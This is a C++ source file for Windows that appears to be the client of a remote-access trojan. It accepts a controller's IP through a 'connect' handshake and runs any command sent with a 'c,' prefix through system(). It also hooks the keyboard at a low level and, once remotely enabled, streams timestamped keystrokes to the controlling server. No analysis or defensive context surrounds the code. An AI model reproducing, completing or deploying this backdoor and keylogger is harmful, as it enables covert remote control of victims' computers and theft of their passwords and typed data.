#include "head\netcom.h"
#include <cstdio>
#include <cstring>
#include <iostream>
#include <mutex>
#include <thread>
#include <windows.h>

const int MaxCommand = 1e3 + 5;
const int MaxIP = 1e2 + 5;

bool key_down_running;
char server_ip[MaxIP];

/**
 *@检测IP地址是否合法
 */
bool checkIP(char *ip)
{
    if (ip == nullptr)
    {
        return false;
    }
    int len = strlen(ip);
    int num = 0;
    int partCount = 0;
    for (int i = 0; i < len; ++i)
    {
        char c;
        c = ip[i];
        if (c >= '0' && c <= '9')
        {
            num = num * 10 + (c - '0');
            if (num > 255)
            {
                return false;
            }
        }
        else if (c == '.')
        {
            if (num < 0 || num > 255 || partCount >= 3)
            {
                return false;
            }
            num = 0;
            partCount++;
        }
        else
        {
            return false;
        }
    }
    if (num < 0 || num > 255 || partCount != 3)
    {
        return false;
    }
    return true;
}

/**
 *@进行握手
 */
void handshake()
{
    for (;;)
    {
        char ComputerName[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
        GetComputerNameA(ComputerName, &size);
        for (;;)
        {
            char *msg = net::Listen(8801);
            printf("%s\n", msg);
            if (strcmp(strtok(msg, " "), "connect") == 0)
            {
                char *ip = strtok(msg + 8, "\0");
                printf("%s\n", ip);
                if (checkIP(ip))
                {
                    strcpy(server_ip, ip);
                    net::Send(ip, 9901, ComputerName);
                }
            }
        }
    }
}

/*
 *@执行来自Hack的命令
 */
void Main()
{
    for (;;)
    {
        char s[MaxCommand];
        strcpy(s, net::Listen(8800));
        printf("%s\n", s);
        if (s[0] == 'c' && s[1] == ',')
        {
            char command_tmp[MaxCommand];
            strcpy(command_tmp, strtok(s + 2, "\0"));
            printf("%s\n", command_tmp);
            system(command_tmp);
        }
        else if (strcmp(s, "check") == 0)
        {
            net::Send(server_ip, 9902, "online");
        }
        else if (strcmp(s, "kt") == 0)
        {
            key_down_running = true;
        }
        else if (strcmp(s, "kf") == 0)
        {
            key_down_running = false;
        }
    }
}

namespace KeyDown
{
char KeyWord[256][20] = {
    {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"},
    {"undefined"}, {"Backspace"}, {"Tab"},       {"undefined"}, {"undefined"}, {"undefined"}, {"Enter"},
    {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"Pause"},     {"CapsLock"},
    {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"Esc"},
    {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"Space"},     {"PgUp"},      {"PgDn"},
    {"End"},       {"Home"},      {"Left"},      {"Up"},        {"Right"},     {"Down"},      {"undefined"},
    {"undefined"}, {"undefined"}, {"PrScr"},     {"Ins"},       {"Del"},       {"undefined"}, {"0"},
    {"1"},         {"2"},         {"3"},         {"4"},         {"5"},         {"6"},         {"7"},
    {"8"},         {"9"},         {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"},
    {"undefined"}, {"undefined"}, {"A"},         {"B"},         {"C"},         {"D"},         {"E"},
    {"F"},         {"G"},         {"H"},         {"I"},         {"J"},         {"K"},         {"L"},
    {"M"},         {"N"},         {"O"},         {"P"},         {"Q"},         {"R"},         {"S"},
    {"T"},         {"U"},         {"V"},         {"W"},         {"X"},         {"Y"},         {"Z"},
    {"Win"},       {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"0"},         {"1"},
    {"2"},         {"3"},         {"4"},         {"5"},         {"6"},         {"7"},         {"8"},
    {"9"},         {"*"},         {"+"},         {"undefined"}, {"-"},         {"."},         {"/"},
    {"F1"},        {"F2"},        {"F3"},        {"F4"},        {"F5"},        {"F6"},        {"F7"},
    {"F8"},        {"F9"},        {"F10"},       {"F11"},       {"F12"},       {"undefined"}, {"undefined"},
    {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"},
    {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"},
    {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"NumLock"},   {"ScrLk"},     {"undefined"},
    {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"},
    {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"Shift"},
    {"Shift"},     {"L-Ctrl"},    {"R-Ctrl"},    {"L-Alt"},     {"R-Alt"},     {"undefined"}, {"undefined"},
    {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"},
    {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"},
    {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {";"},         {"="},         {","},
    {"-"},         {"."},         {"/"},         {"`"},         {"undefined"}, {"undefined"}, {"undefined"},
    {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"},
    {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"},
    {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"},
    {"undefined"}, {"undefined"}, {"["},         {"\\"},        {"]"},         {"'"},         {"undefined"},
    {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"},
    {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"},
    {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"},
    {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"},
    {"undefined"}, {"undefined"}, {"undefined"}, {"undefined"}};
HHOOK keyboardHook;
char *lok1 = KeyWord[0];
int num = 1;
int ft, et;
LRESULT CALLBACK LowLevelKeyboardProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam)
{
    KBDLLHOOKSTRUCT *ks = (KBDLLHOOKSTRUCT *)lParam;
    if (ks->flags == 0 || ks->flags == 1)
    {
        if (lok1 == KeyWord[ks->vkCode])
        {
            num++;
        }
        else
        {
            lok1 = KeyWord[ks->vkCode];
            ft = ks->time;
            time_t now = time(nullptr);
            char datetime[105];
            strftime(datetime, sizeof(datetime), "%Y-%m-%d %H:%M:%S", localtime(&now));
            char message_tmp[1005];
            sprintf(message_tmp, "[%s]:+%s\n", datetime, KeyWord[ks->vkCode]);
            if (key_down_running)
            {
                net::Send(server_ip, 9903, message_tmp);
            }
        }
    }
    else if (ks->flags == 128 || ks->flags == 129)
    {
        lok1 = KeyWord[0];
        et = ks->time;
        if (num != 1)
        {
            time_t now = time(nullptr);
            char datetime[105];
            strftime(datetime, sizeof(datetime), "%Y-%m-%d %H:%M:%S", localtime(&now));
            char message_tmp[1005];
            sprintf(message_tmp, "[%s]:-%s\n", datetime, KeyWord[ks->vkCode]);
            if (key_down_running)
            {
                net::Send(server_ip, 9903, message_tmp);
            }
            num = 1;
        }
        else
        {
            time_t now = time(nullptr);
            char datetime[105];
            strftime(datetime, sizeof(datetime), "%Y-%m-%d %H:%M:%S", localtime(&now));
            char message_tmp[1005];
            sprintf(message_tmp, "[%s]:-%s\n", datetime, KeyWord[ks->vkCode]);
            if (key_down_running)
            {
                net::Send(server_ip, 9903, message_tmp);
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
int keyWord()
{
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandleA(NULL), NULL);
    MSG msg;
    for (;;)
    {
        if (PeekMessageA(&msg, NULL, NULL, NULL, PM_REMOVE))
        {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
        else
        {
            Sleep(0);
        }
    }
    UnhookWindowsHookEx(keyboardHook);
}
} // namespace KeyDown

int main()
{
    std::thread hand(handshake);
    std::thread background(Main);
    std::thread keydown_listen(KeyDown::keyWord);
    for (;;)
    {
    }
    return 0;
}